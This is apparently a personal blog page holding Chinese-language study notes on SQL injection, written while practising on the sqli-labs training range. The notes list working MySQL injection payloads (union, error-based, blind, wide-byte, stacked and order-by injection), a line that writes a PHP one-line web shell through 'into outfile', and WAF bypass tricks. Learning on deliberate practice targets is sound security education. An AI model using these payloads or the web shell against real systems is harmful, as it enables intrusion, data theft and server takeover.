@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="����,Tianze" />
+   
+  <meta name="description" content="����˳Ӧ δ����ӭ ��ʱ���� �ȹ����� &#39;&#39;" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    sql注入学习笔记 |  Tianze&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Tianze's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content on">
+      <section class="outer">
+  <article id="post-sql注入学习笔记" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  sql注入学习笔记
+</h1>
+ 
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/09/26/SQL-injection-study-notes/" class="article-date">
+  <time datetime="2020-09-26T03:50:07.000Z" itemprop="datePublished">2020-09-26</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">6 min</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+
+      
+      <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>sql注入作为owasp top 10的榜首，其重要程度不言而喻。这里我通过对sqli-labs靶场的练习，来学习和入门sql注入。<a id="more"></a></p>
+<h1 id="0x00靶场搭建"><a href="#0x00靶场搭建" class="headerlink" title="0x00靶场搭建"></a>0x00靶场搭建</h1><p>1.phpstudy</p>
+<p>2.docker</p>
+<p>具体搭建方法自行搜索</p>
+<h1 id="0x01个人学习笔记"><a href="#0x01个人学习笔记" class="headerlink" title="0x01个人学习笔记"></a>0x01个人学习笔记</h1><p>sql注入过程:</p>
+<p>判断注入点和注入类型  ‘、’)、’))、”、”)、”))</p>
+<p>判断字段数 order by或者union select</p>
+<p>判断显示位</p>
+<p>爆数据库SELECT * FROM information_schema.schemata</p>
+<p>获取表民 select table_name from information_schema.tables where table_schema=database()</p>
+<p>获取字段名 select column_name from information_schema.columns where table_name=’xxx’</p>
+<p>获取数据 select xxx from table_name</p>
+<p>系统函数 </p>
+<ol>
+<li>version()——MySQL 版本 </li>
+<li>user()——数据库用户名 </li>
+<li>database()——数据库名 </li>
+<li>@@datadir——数据库路径 </li>
+<li>@@version_compile_os——操作系统版本</li>
+</ol>
+<p>联合注入、双查询注入、盲注、报错注入、宽字节注入</p>
+<p>注释: –+(get)、#(post)、 /*   */</p>
+<p>字符拼接:concat、concat_ws、group_concat</p>
+<p>盲注思路</p>
+<p>猜表数</p>
+<p>逐个猜解表长和表名</p>
+<p>逐个猜解每个表的列数、列长、列名</p>
+<p>获取数据</p>
+<p>布尔盲注、时间盲注、报错盲注</p>
+<p>盲注函数<br>ascii()、ord()、chr()<br>substr()、left()、mid()<br>regexp ‘^xxx’、like ‘xxx%’<br>if()<br>length()<br>count()<br>sleep()</p>
+<p>聚合函数和group by报错 floor(rand(0)*2)报错输出字符限制64个<br>手工盲注非常费时，仅需了解原理即可。最好用自动化脚本盲注，自己用python写脚本或者使用sqlmap等工具。</p>
+<p>报错注入</p>
+<p>1.主键重复floor报错<br>select count(<em>),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),’~’,floor(rand(0)</em>2))a from information_schema.tables group by a–+</p>
+<p>如果关键表被禁用的payload</p>
+<p>select count(<em>) from ((select 1 union select null union select !1)a) group by concat(version(),’~’,floor(rand(0)</em>2))–+</p>
+<p>2.exp报错(double数据溢出)<br>select exp(~(select * from(select table_name from information_schema.tables where table_schema=database() limit 0,1)a))–+</p>
+<p>3.Xpath报错<br>and extractvalue(1,concat(0x7e,(select version()),0x7e))–+<br>and updatexml(1,concat(0x7e,(select version()),0x7e),1)–+<br>updatexml和extractvalue原理相同,只是updatexml函数多一个参数。</p>
+<p>4.Bigint溢出报错  利用逐位取反~和逻辑取反!，可以构造出很多种的Bigint溢出<br>select (!(select * from (select user())a) - ~0),2,3–+</p>
+<p>5.name_const()列名重复报错<br>select * from(select name_const(version(),1),name_const(version(),1))a–+</p>
+<p>name_const函数要求参数必须是常量所以要配合join函数使用(网上的payload好像不行，而且关于join这个函数没有找到比较详细的解释，不太懂）</p>
+<p>6.空间数据类型函数错误(几何函数)</p>
+<p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()<br>这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行<br>select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b))–+</p>
+<p>select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b))–+</p>
+<p>select * from products where pid=1 and polygon((select * from(select * from(select user())a)b))–+</p>
+<p>select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b))–+</p>
+<p>select * from products where pid=1 and linestring((select * from(select * from(select user())a)b))–+</p>
+<p>select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b))–+</p>
+<p>into outfile导入文件<br>select ‘<?php @eval($_POST['password']);?>‘ into outfile ‘c:\\xxx\\xx\\shell.php’   用\\是为了防止转义，写一句话用蚁剑连接。</p>
+<p>宽字节注入 </p>
+<p>GB2312 GBK GB18030等等都是宽字节编码，即两个字节表示一个中文（前一个ascii码大于128，为汉字范围）</p>
+<p>‘ 过滤后变成 &#39;   把前面的\去掉有两种思路：</p>
+<p>1.用%df吃掉 \。%5c表示\，那么%df%5c就是一个汉字</p>
+<p>2.将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</p>
+<p>堆叠注入</p>
+<p>通过 ; 再连接一个select语句，可以增删改查，可以写一句话脚本</p>
+<p>order by后的注入</p>
+<p>order by默认升序排序    加上desc就是降序</p>
+<p>?sort=1 into outfile ‘xxxx’ lines terminated by 0x（十六进制转码的一句话），可以把排序的结果导出，并在每行最后加入一句话。</p>
+<p>1.直接添加查询语句，?sort=sql语句</p>
+<p>2.利用一些函数，如rand()函数，?rand(sql语句) ，此外，rand(true)和rand(false)的结果是不一样的</p>
+<p>3.利用and，?sort=x and sql语句</p>
+<p>sql语句可以利用报错注入和时间盲注</p>
+<p>4.procedure analyse参数后注入,利用procedure analyse参数，可以执行报错注入，?sort=1 procedure analyse(extractvalue(1,concat(0x7e,xxxx)))</p>
+<p>waf绕过</p>
+<p>1.白盒绕过：知道源代码，通过代码审计</p>
+<p>2.黑盒绕过：</p>
+<p>架构层面绕过waf：</p>
+<p>(1).寻找源网站绕过waf检测，主要针对云waf，找到源网站的真实ip地址进行绕过，有点像CDN</p>
+<p>(2).通过同网段绕过waf，在同一个网段中，可能经过的数据不会经过云waf，从来实现绕过</p>
+<p>资源限制角度绕过waf：一般waf的执行需要优先考虑业务优先的原则，所以对于构造较大、超大数据包可能不会进行检测，从而实现绕过waf</p>
+<p>协议层面绕过waf</p>
+<p>(1).协议未覆盖绕过waf，比如由于业务需要，只对get型进行检测，post数据选择忽略</p>
+<p>(2).参数污染，index?id=1&amp;id=2 waf可能只对id=1进行检测          （服务器两层架构)</p>
+<p>规则层面绕过waf</p>
+<p>基本方法有：大小写变形、双写、编码(hex、urlencode)、添加注释/**/、利用符号and=&amp;&amp; or=||  like可以替换=  &lt;&gt;等价于!=</p>
+<p>注释符绕过，用/**/代替空格进行绕过</p>
+<p>空白符绕过，mysql空白符%09; %0A; 或/**/等等</p>
+<p>函数分割符号，例如concat/**/(</p>
+<p>浮点数词法解释 waf对于id=1可以检测，但是对于id=1E0、id=1.0、id=\N可能就无法检测</p>
+<p>利用报错注入</p>
+<p>mysql特殊语法：select{x 1}   select {x schema_name} from {x information_schema.schemata} </p>
+<p>3.fuzz模糊测试，可以用burpsuite配合手工进行测试，测试成功后再用脚本进行处理</p>
+<h1 id="0x02参考资料"><a href="#0x02参考资料" class="headerlink" title="0x02参考资料"></a>0x02参考资料</h1><p>在进行靶场注入学习的过程中，我搜索了很多的write up和文章，我觉得写的比较好的是<a href="https://www.bilibili.com/video/BV1e441127Rd?from=search&seid=7152236715376995357" target="_blank" rel="noopener">b站视频</a>、<a href="https://www.cnblogs.com/lcamry/p/5763169.html" target="_blank" rel="noopener">注入天书</a>、<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">报错注入总结</a></p>
+<h1 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h1><p>通过sqli-labs的练习，基本入门了sql注入，然而我认为这还远远不够。对于盲注，还需要学习python脚本的编写，通过脚本进行自动化注入，也可以使用sqlmap工具。对于刚入门的我，以后还有很多东西要学，各种绕过的姿势等等</p>
+
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>Copyright： </strong>
+              Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/09/26/SQL-injection-study-notes/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2021/02/03/introduction-to-misc/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            misc入门之图片隐写
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/04/27/prompt1-to-win/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">prompt(1)-to-win学习记录</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        notify: 'false',
+        verify: 'false',
+        avatar: 'monsterid',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2021
+        <i class="ri-heart-fill heart_icon"></i> Blog of Tianze
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Tianze&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/literature">文集</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/url">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/url">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+      strings: ['曾经沧海难为水，除却巫山不是云', '物来顺应，未来不迎，当时不杂，既过不恋', ''],
+      startDelay: 0,
+      typeSpeed: 200,
+      loop: true,
+      backSpeed: 100,
+      showCursor: true
+    });
+  } catch (err) {
+  }
+
+</script>
+
+
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+
+  
+<script src="/js/clickLove.js"></script>
+
+
+
+<!-- 复制 -->
+
+  
+<link rel="stylesheet" href="/css/clipboard.css">
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=27927357&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+</body>
+
+</html>
